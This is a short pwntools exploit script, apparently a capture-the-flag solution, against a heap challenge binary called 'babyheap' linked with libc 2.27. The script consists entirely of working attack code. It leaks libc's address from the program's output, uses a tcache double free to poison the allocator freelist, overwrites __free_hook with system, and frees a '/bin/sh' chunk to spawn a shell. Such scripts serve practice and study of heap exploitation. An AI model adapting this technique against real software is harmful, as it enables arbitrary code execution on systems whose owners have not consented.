from pwn import *
context.binary = elf = ELF('./babyheap', checksec=False)

s = process('./babyheap', env={'LD_PRELOAD':'./libc-2.27.so'})
libc = ELF('./libc-2.27.so', checksec=False)

def malloc(content):
    s.sendlineafter('> ', '1')
    s.sendlineafter('Input Content: ', content)

def free():
    s.sendlineafter('> ', '2')

def wipe():
    s.sendlineafter('> ', '3')

def exit():
    s.sendlineafter('> ', '0')

# Welcome to babyheap challenge!
s.recvline()
# Present for you!!
s.recvline()
#>>>>> 0x7f0ac557ea00 <<<<<
stdin_addr = int(s.recvline()[6:-7], 16)
libc.address = stdin_addr - libc.symbols._IO_2_1_stdin_
print('libc_base:', hex(libc.address))
print('puts:', hex(libc.symbols.puts))

malloc('hoge')
free()
free()
wipe()
malloc(p64(libc.symbols.__free_hook))
wipe()
malloc('hoge')
wipe()
malloc(p64(libc.symbols.system))
wipe()
malloc('/bin/sh')
free()

s.interactive()
